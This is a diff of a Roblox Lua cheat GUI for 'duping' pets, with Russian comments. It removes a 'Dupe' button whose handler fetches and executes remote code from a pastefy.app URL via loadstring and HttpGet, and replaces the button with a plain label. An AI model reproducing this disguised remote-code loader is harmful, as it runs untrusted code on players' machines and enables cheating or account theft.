@@ -5,17 +5,10 @@ local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")
 local DupeTab = Window:NewTab("Dupe Pet")
 local DupeSection = DupeTab:NewSection("DUPE PET")
 
--- Текстовое поле с подсказкой
-local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
-    -- Обработка введенного текста
-end)
-InputField.Instance.Size = UDim2.new(0, 250, 0, 30)
-
--- Кнопка Dupe
-DupeSection:NewButton("Dupe", "", function()
-    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
-end)
+-- Здесь можно добавить элементы интерфейса
+-- Например:
+DupeSection:NewLabel("def")  -- Надпись "def" как на изображении
 
 -- Вкладка Credits
 local CreditsTab = Window:NewTab("CREDITS")
-CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
+CreditsTab:NewSection("Made by Mangekoy2 | v2.0")  -- Точная подпись как вы просили
